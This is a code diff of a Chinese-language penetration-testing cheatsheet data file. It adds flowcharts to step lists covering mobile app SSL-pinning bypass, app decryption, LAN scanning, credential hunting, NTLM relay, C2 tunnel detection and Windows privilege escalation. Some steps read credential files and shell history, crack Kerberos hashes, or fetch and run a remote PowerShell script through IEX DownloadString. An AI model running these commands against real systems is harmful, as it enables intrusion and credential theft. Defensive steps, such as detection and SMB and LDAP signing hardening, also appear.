+      { title: "起 mitmproxy 并把 CA 装进 iOS", mermaid: `flowchart TD\n    A[iOS 抓包] --> B{越狱?}\n    B -- 是 --> C[SSL Kill Switch 2\n或 Frida]\n    B -- 否 --> D[Stream 走中间人]\n    D --> E{APP 检测代理?}\n    E -- 是 --> F[免流证书钉死\nFrida bypass]\n    E -- 否 --> G[直接抓]`, cmd: "mitmproxy -p 8080\n# 手机 Safari 打开 http://mitm.it 装描述文件\n# 设置 → 通用 → VPN 与设备管理 → 安装描述文件\n# 设置 → 通用 → 关于本机 → 证书信任设置 → 打开 mitmproxy" },
       { title: "手机连代理", cmd: "# WiFi → 详情 → HTTP 代理 → 手动 → PC-IP:8080" },
       { title: "越狱：SSL Kill Switch 2 一劳永逸", cmd: "# Cydia / Sileo 装 SSL Kill Switch 2\n# 设置 → SSL Kill Switch 2 → Disable Certificate Validation → ON" },
       { title: "非越狱 + SSL Pinning：走 Frida", cmd: "# 用 iOS 版 frida（需 SSH）\nfrida -U -f com.target.app -l ios-ssl-kill-switch.js --no-pause", tool: "frida" },
@@ -826,7 +826,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["android", "逆向", "静态"],
     severity: "info",
     steps: [
-      { title: "拆 APK", cmd: "apktool d target.apk -o out/\nunzip -o target.apk -d out-raw/\n# 看 manifest\nrg -n 'exported\\|permission\\|scheme' out/AndroidManifest.xml" },
+      { title: "拆 APK", mermaid: `flowchart TD\n    A[APK] --> B{反编译}\n    B --> C[apktool d]\n    C --> D[看 AndroidManifest]\n    D --> E[组件/权限/入口]\n    E --> F[smali 看关键函数]\n    F --> G{加密逻辑?}\n    G --> H[IDA/Ghidra\nARM 反汇编]`, cmd: "apktool d target.apk -o out/\nunzip -o target.apk -d out-raw/\n# 看 manifest\nrg -n 'exported\\|permission\\|scheme' out/AndroidManifest.xml" },
       { title: "反编 Java", cmd: "# dex → jar\nd2j-dex2jar target.apk -o target.jar\n# jadx 一把梭\njadx target.apk -d jadx-out/\njadx-gui target.apk" },
       { title: "全局搜硬编 key / URL / 秘钥", cmd: "rg -n --hidden 'AKIA[0-9A-Z]{16}\\|sk-[a-zA-Z0-9]{20,}\\|-----BEGIN' jadx-out/\nrg -n 'https?://' jadx-out/ | rg -v '(schemas\\.\\|w3\\.org)' | head -50" },
       { title: "看 native so", cmd: "ls out/lib/\nreadelf -d out/lib/arm64-v8a/libnative.so | head\nstrings out/lib/arm64-v8a/libnative.so | rg -i 'key\\|token\\|url'\n# Ghidra / IDA 打开做反编" },
@@ -842,7 +842,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["android", "frida", "动态"],
     severity: "info",
     steps: [
-      { title: "配 frida-server", cmd: "# 装对架构\nadb shell getprop ro.product.cpu.abi\nadb push frida-server-arm64 /data/local/tmp/frida-server\nadb shell 'su -c \"chmod +x /data/local/tmp/frida-server && /data/local/tmp/frida-server -l 0.0.0.0:27042 &\"'\nfrida-ps -U | head", tool: "frida" },
+      { title: "配 frida-server", mermaid: `flowchart TD\n    A[Frida hook] --> B{root/非root}\n    B -- root --> C[frida-server]\n    B -- 非root --> D[frida-gadget\n注入 APK]\n    D --> E[spawn/attach]\n    E --> F[JS 脚本 hook 类]\n    F --> G[打印入参返回值]\n    G --> H[改返回值改逻辑]`, cmd: "# 装对架构\nadb shell getprop ro.product.cpu.abi\nadb push frida-server-arm64 /data/local/tmp/frida-server\nadb shell 'su -c \"chmod +x /data/local/tmp/frida-server && /data/local/tmp/frida-server -l 0.0.0.0:27042 &\"'\nfrida-ps -U | head", tool: "frida" },
       { title: "attach 目标", cmd: "frida -U -f com.target.app --no-pause -l hook.js\n# 或 spawn 已运行的\nfrida -U -n com.target.app -l hook.js" },
       { title: "hook Java 抓函数参数", cmd: "cat > hook.js <<'JS'\nJava.perform(function () {\n  var C = Java.use('com.target.crypto.Signer');\n  C.sign.implementation = function (data, key) {\n    console.log('sign() called len=' + data.length + ' key=' + key);\n    var r = this.sign(data, key);\n    console.log('  -> ' + r);\n    return r;\n  };\n});\nJS" },
       { title: "hook native 函数", cmd: "cat > native.js <<'JS'\nvar addr = Module.findExportByName('libnative.so', 'do_sign');\nInterceptor.attach(addr, {\n  onEnter: function (a) { console.log('do_sign(', a[0].readUtf8String(), ')'); },\n  onLeave: function (r) { console.log('  = ', r.readUtf8String()); },\n});\nJS" },
@@ -858,7 +858,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["ios", "砸壳", "越狱"],
     severity: "info",
     steps: [
-      { title: "确认设备状态", cmd: "iproxy 2222 22 &\nssh -p 2222 root@127.0.0.1  # 默认密码 alpine（改掉！）\nuname -a\napt list --installed 2>/dev/null | rg -i 'frida\\|cycript'" },
+      { title: "确认设备状态", mermaid: `flowchart TD\n    A[IPA 加密] --> B{越狱机?}\n    B -- 是 --> C[frida-ios-dump\n一键 dump]\n    B -- 否 --> D[bagbak 工具]\n    D --> E[重签名安装]\n    E --> F[class-dump 看头文件]\n    F --> G[Hopper/Ghidra\nARM64 反汇编]`, cmd: "iproxy 2222 22 &\nssh -p 2222 root@127.0.0.1  # 默认密码 alpine（改掉！）\nuname -a\napt list --installed 2>/dev/null | rg -i 'frida\\|cycript'" },
       { title: "frida-ios-dump（推荐）", cmd: "git clone https://github.com/AloneMonkey/frida-ios-dump\ncd frida-ios-dump\npip3 install -r requirements.txt\n./dump.py com.target.app  # 或 应用中文名" },
       { title: "查砸壳成功", cmd: "otool -l target.decrypted | rg -A4 LC_ENCRYPTION_INFO\n# cryptid 应为 0" },
       { title: "class-dump 拉 header", cmd: "class-dump -H target.decrypted -o headers/\nrg -n 'password\\|token\\|encrypt' headers/ | head -30" },
@@ -876,7 +876,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["内网", "扫段", "recon"],
     severity: "warn",
     steps: [
-      { title: "先摸自己", cmd: "ip -br a; ip route; cat /etc/resolv.conf\narp -an | head -20\ncat /etc/hosts" },
+      { title: "先摸自己", mermaid: `flowchart TD\n    A[拿到跳板] --> B{扫存活}\n    B --> C[fping/nmap -sn]\n    C --> D[端口爆破\n弱口令]\n    D --> E{域?}\n    E -- 是 --> F[BloodHound\nAD 关系图]\n    E -- 否 --> G[弱口令/默认\nsnmp public]\n    F --> H[定位 DA/EA\n规划路径]`, cmd: "ip -br a; ip route; cat /etc/resolv.conf\narp -an | head -20\ncat /etc/hosts" },
       { title: "扫存活主机（ICMP + TCP fallback）", cmd: "# fping 快\nfping -a -q -g 10.0.0.0/24 2>/dev/null\n# 静默场景用 tcp 探测\nnmap -sn -PS22,80,443,3389,445 10.0.0.0/24", tool: "nmap" },
       { title: "常见高价值端口扫", cmd: "nmap -Pn -n --open -T4 -p 22,80,443,445,3306,3389,5432,6379,8080,8443,9200,27017 10.0.0.0/24 -oA lan-scan" },
       { title: "Web 资产画像", cmd: "cat lan-scan.gnmap | rg 'Ports:' | awk '{print $2}' | while read ip; do\n  for p in 80 443 8080 8443; do\n    curl -sk -m 3 -o /dev/null -w \"%{http_code} %{url_effective} %{redirect_url}\\n\" http://$ip:$p/\n  done\ndone" },
@@ -892,7 +892,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["凭据", "hunt", "内网"],
     severity: "danger",
     steps: [
-      { title: "本机敏感文件", cmd: "sudo rg -n --hidden -uu '(password|passwd|secret|api[_-]?key|token|AKIA[0-9A-Z]{16})\\s*[:=]' /etc /root /home 2>/dev/null | head -80\nfind / -name '*.kdbx' -o -name '*.pfx' -o -name 'id_rsa*' -o -name '.aws' -o -name '.kube' 2>/dev/null" },
+      { title: "本机敏感文件", mermaid: `flowchart TD\n    A[凭据收集] --> B{在哪里?}\n    B -- 浏览器 --> C[SharpChrome\nHackBrowserData]\n    B -- 配置文件 --> D[.ssh/id_rsa\n.kube/config]\n    B -- 进程内存 --> E[mimikatz\nprocdump]\n    B -- 云元数据 --> F[IMDS 凭据]\n    C --> G[建表\n去重]`, cmd: "sudo rg -n --hidden -uu '(password|passwd|secret|api[_-]?key|token|AKIA[0-9A-Z]{16})\\s*[:=]' /etc /root /home 2>/dev/null | head -80\nfind / -name '*.kdbx' -o -name '*.pfx' -o -name 'id_rsa*' -o -name '.aws' -o -name '.kube' 2>/dev/null" },
       { title: "history / lastlog", cmd: "cat ~/.bash_history ~/.zsh_history 2>/dev/null | rg -i 'passwd\\|token\\|curl.*-u\\|sshpass\\|mysql.*-p'\nsudo cat /root/.bash_history 2>/dev/null | rg -i 'passwd\\|token'" },
       { title: "SSH known_hosts / config（横向目标）", cmd: "cat ~/.ssh/known_hosts ~/.ssh/config 2>/dev/null\n# 谁登过来\nlast -F | head -20\ncat /var/log/wtmp | last -f - | head" },
       { title: "SSHD / sudo 曾输入密码", cmd: "# 有些环境走 pam 记明文（合规问题）\nsudo rg -n '(pam_userdb|pam_python)' /etc/pam.d/\nsudo journalctl -u sshd | rg -i 'accepted\\|failed'" },
@@ -909,7 +909,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["smb", "ntlm", "relay"],
     severity: "danger",
     steps: [
-      { title: "找哪些主机没开 SMB signing（易被 relay）", cmd: "# Impacket 里的 smbmap 也行\ncrackmapexec smb 10.0.0.0/24 --gen-relay-list relay-targets.txt\ncat relay-targets.txt" },
+      { title: "找哪些主机没开 SMB signing（易被 relay）", mermaid: `flowchart TD\n    A[捕获 NTLM] --> B{relay 到哪?}\n    B --> C[域内机器\n未签 SMB]\n    C --> D[ntlmrelayx]\n    D --> E[拿到 shell]\n    E --> F[导出 SAM/LSA\nDCSync]\n    A2[防御] --> G[强制 SMB 签名\nLDAP signing]`, cmd: "# Impacket 里的 smbmap 也行\ncrackmapexec smb 10.0.0.0/24 --gen-relay-list relay-targets.txt\ncat relay-targets.txt" },
       { title: "看是否有异常 responder / mitm6", cmd: "# 网关 / 交换机镜像口抓\nsudo tcpdump -i eth0 -nn 'port 5355 or port 137 or port 138 or port 5353 or udp port 547' -w llmnr.pcap\n# Windows 端：确认 LLMNR / NBT-NS / mDNS 是否被回应" },
       { title: "AD 侧看谁在打", cmd: "# 域控查 event 4624 类型 3 + NTLM V1 认证\nGet-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 500 |\n  Where-Object { $_.Properties[10].Value -like '*NTLM*' } |\n  Format-Table TimeCreated,@{n='src';e={$_.Properties[19].Value}},@{n='user';e={$_.Properties[5].Value}}" },
       { title: "止血：SMB signing + LDAP signing + EPA", cmd: "# GPO / 注册表\nComputer Config > Windows Settings > Security > Local Policies > Security Options:\n  Microsoft network client: Digitally sign communications (always) = Enabled\n  Microsoft network server: Digitally sign communications (always) = Enabled\n# LDAP\n  Domain controller: LDAP server signing requirements = Require signing\n# EPA (Extended Protection for Authentication) 打开" },
@@ -925,7 +925,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["c2", "隧道", "出网"],
     severity: "danger",
     steps: [
-      { title: "看主机所有 ESTABLISHED 长连接", cmd: "ss -tnp state established | awk '{print $4, $5, $6}' | sort -u\n# 按远端 IP 归并\nss -tnp state established | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head" },
+      { title: "看主机所有 ESTABLISHED 长连接", mermaid: `flowchart TD\n    A[异常出向] --> B{长连接 + 加密?}\n    B -- 是 --> C[chisel/frp/ngrok]\n    C --> D[netstat -tn\n持续连接]\n    D --> E[目的 IP 归属]\n    E --> F[运营商/IDC]\n    F --> G[封端口\n查进程树]`, cmd: "ss -tnp state established | awk '{print $4, $5, $6}' | sort -u\n# 按远端 IP 归并\nss -tnp state established | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head" },
       { title: "过陌生进程的 socket", cmd: "for pid in $(ps -eo pid --no-headers); do\n  cmd=$(cat /proc/$pid/comm 2>/dev/null)\n  case $cmd in sshd|nginx|systemd*|kubelet|containerd|dockerd|chrome|firefox) continue;; esac\n  ss -tnp 2>/dev/null | rg \"pid=$pid,\" && echo \"^ $pid $cmd\"\ndone | head -40" },
       { title: "看 ssh -R / autossh 反向端口", cmd: "sudo ss -tlnp | rg sshd\nps -ef | rg -i 'ssh .*-R\\|autossh\\|frpc\\|frps\\|chisel\\|ngrok\\|nps\\|revsocks\\|gost'" },
       { title: "DNS 隧道迹象", cmd: "# 出口 DNS 请求量突增 / 长子域名\nsudo tcpdump -i any -nn -s0 port 53 -w dns.pcap -c 5000\ntshark -r dns.pcap -T fields -e dns.qry.name | awk '{print length, $0}' | sort -rn | head -20" },
@@ -941,7 +941,7 @@ export const cheatsheets: Cheatsheet[] = [
     tags: ["windows", "提权", "ad"],
     severity: "warn",
     steps: [
-      { title: "本机跑 winPEAS / PowerUp", cmd: "# 上传 winPEASx64.exe\n.\\winPEASx64.exe > peas.txt\npowershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/PowerUp.ps1'); Invoke-AllChecks\"" },
+      { title: "本机跑 winPEAS / PowerUp", mermaid: `flowchart TD\n    A[user → admin] --> B{服务漏洞?}\n    B -- 服务权限弱 --> C[sc qc + 改路径]\n    B -- AlwaysInstallElevated --> D[msi 提权]\n    B -- UAC bypass --> E[fodhelper\neventvwr]\n    B -- 内核漏洞 --> F[PrintNightmare\nHiveNightmare]\n    F --> G[提权到 SYSTEM]`, cmd: "# 上传 winPEASx64.exe\n.\\winPEASx64.exe > peas.txt\npowershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/PowerUp.ps1'); Invoke-AllChecks\"" },
       { title: "服务弱权限 / unquoted path", cmd: "# 找可写服务\naccesschk.exe -uwcqv \"Authenticated Users\" *\n# unquoted service path\nwmic service get name,pathname,displayname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\\\"\"" },
       { title: "AD Kerberos：Kerberoast / AS-REP", cmd: "# 域内任意用户可跑\nRubeus.exe kerberoast /outfile:hashes.txt\nRubeus.exe asreproast /outfile:asrep.txt\nhashcat -m 13100 hashes.txt wordlist.txt   # Kerberoast\nhashcat -m 18200 asrep.txt wordlist.txt    # AS-REP" },
       { title: "BloodHound 找攻击路径", cmd: "# 采集\nSharpHound.exe -c All\n# 导入 BloodHound GUI，查 shortest path to Domain Admins", tool: "bloodhound" },
